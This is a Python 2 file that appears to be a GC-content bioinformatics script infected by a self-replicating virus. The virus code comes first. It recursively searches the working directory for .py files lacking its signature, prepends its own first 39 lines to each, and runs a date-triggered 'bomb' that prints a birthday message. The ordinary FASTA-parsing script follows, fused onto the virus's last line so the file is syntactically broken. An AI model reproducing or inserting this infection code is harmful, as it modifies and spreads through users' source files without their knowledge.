#!/usr/bin/python
import os
import datetime
SIGNATURE = "CRANKLIN PYTHON VIRUS"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print "HAPPY BIRTHDAY CRANKLIN!"
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()f = open('rosalindGCFasta.txt', 'r')
raw_samples = f.readlines()
f.close()

samples = {}
cur_key = ''

for elem in raw_samples:
    if elem[0] == '>':
        cur_key = elem[1:].rstrip()
        samples[cur_key] = ''
    else:
        samples[cur_key] += elem.rstrip()

for s_id, s in samples.iteritems():
    samples[s_id] = (float(s.count('G') + s.count('C')) / len(s)) * 100

(s_id, gc) = max(list(samples.iteritems()), key=lambda item: item[1])
print s_id
print gc